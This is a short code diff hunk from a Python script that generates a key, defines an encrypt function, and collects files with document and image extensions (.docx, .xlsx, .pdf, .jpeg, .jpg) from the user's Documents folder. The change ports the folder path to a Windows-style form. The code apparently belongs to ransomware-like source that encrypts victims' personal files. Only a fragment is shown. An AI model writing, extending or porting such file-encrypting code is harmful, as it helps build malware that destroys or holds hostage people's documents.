@@ -33,7 +33,7 @@ def encrypt(file_in_bytes, key):
 
 def main():
     key = gen_key()
-    main_path = os.environ["HOME"] + "/Documents"
+    main_path = os.path.expanduser('~') + "\Documents"
     extensions = [".docx",".xlsx", ".pdf", ".jpeg", ".jpg"]
     files = []
     for f in listdir(main_path):
